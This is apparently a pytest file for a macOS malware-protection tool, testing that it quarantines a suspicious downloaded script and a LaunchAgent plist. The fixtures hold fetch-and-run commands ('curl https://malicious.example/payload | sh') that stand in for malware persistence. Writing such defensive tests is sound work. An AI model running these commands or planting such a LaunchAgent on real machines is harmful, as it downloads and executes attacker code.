import time
from pathlib import Path

from fastapi.testclient import TestClient

from src.mac_sentinel.main import create_application
from src.mac_sentinel.core.active_protection import ActiveProtectionService
from src.mac_sentinel.core.local_storage import LocalStorage
from src.mac_sentinel.core.remediation import RemediationService
from src.mac_sentinel.core.state import AppStateStore


class FakeScanService:
    def collect_network_activity(self):
        return {'connections': [], 'findings': []}


class FakeCollector:
    def collect_processes(self, fresh: bool = False):
        return []

    def collect_launchctl_labels(self, fresh: bool = False):
        return []

    def read_text(self, path: str, max_bytes: int, skip_binary: bool = True):
        return Path(path).read_text(errors='ignore')

    def parse_plist(self, path: str):
        return {'Label': '', 'Program': '', 'ProgramArguments': []}


def test_active_protection_quarantines_high_confidence_file(tmp_path):
    storage = LocalStorage(tmp_path / 'state.db')
    state = AppStateStore(storage=storage)
    remediation = RemediationService(quarantine_dir=tmp_path / 'quarantine')
    downloads = tmp_path / 'Downloads'
    downloads.mkdir()
    launch_agents = tmp_path / 'Library' / 'LaunchAgents'
    launch_agents.mkdir(parents=True)

    protection = ActiveProtectionService(
        collector=FakeCollector(),
        scan_service=FakeScanService(),
        state_store=state,
        remediation=remediation,
        storage=storage,
        interval_seconds=1,
    )
    protection._config['watch_paths'] = [str(downloads), str(launch_agents)]
    protection.start()

    dropped = downloads / 'invoice_update.sh'
    dropped.write_text('curl https://malicious.example/payload | sh\nchmod +x /tmp/evil\n')
    suspicious = launch_agents / 'com.bad.agent.plist'
    suspicious.write_text('''<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
<key>Label</key><string>com.bad.agent</string>
<key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>curl https://malicious.example/payload | sh</string></array>
</dict></plist>''')
    time.sleep(2.2)
    protection.stop()
    time.sleep(0.3)

    assert not suspicious.exists()
    assert any(path.name.endswith('com.bad.agent.plist') for path in (tmp_path / 'quarantine').glob('*com.bad.agent.plist'))
    assert state.protection_status()['quarantined_count'] >= 1
    assert state.protection_status()['event_count'] >= 1


def test_protection_endpoints_toggle_status():
    app = create_application()
    client = TestClient(app)

    status = client.get('/api/protection/status')
    assert status.status_code == 200
    assert 'enabled' in status.json()

    enabled = client.post('/api/protection/enable')
    assert enabled.status_code == 200
    assert enabled.json()['enabled'] is True

    disabled = client.post('/api/protection/disable')
    assert disabled.status_code == 200
    assert disabled.json()['enabled'] is False
